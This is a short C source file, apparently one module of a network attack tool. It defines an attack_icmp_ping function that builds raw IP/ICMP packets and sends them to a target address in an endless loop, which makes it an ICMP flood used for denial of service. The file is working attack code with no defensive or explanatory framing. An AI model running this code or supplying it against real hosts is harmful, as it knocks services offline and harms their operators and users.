#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "tcp_attack.h"
#include "packet.h"
#include "utils.h"
#include "types.h"

void attack_icmp_ping(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct icmp_hdr *icmph = (struct icmp_hdr *)(buffer + sizeof(struct ip_hdr));

	seed_rand(time(NULL));

	target->addr.sin_family = AF_INET;
	target->addr.sin_port = 0;
	target->addr.sin_addr.s_addr = target->target_addr;
	target->sockfd = init_socket(IPPROTO_ICMP);

	while (1) {
		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct icmp_hdr),
			IPPROTO_ICMP, target->target_addr);
		build_icmp(icmph);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target->addr,
				sizeof(struct sockaddr_in)) == -1) {
			exit(EXIT_FAILURE);
                }
	}
}
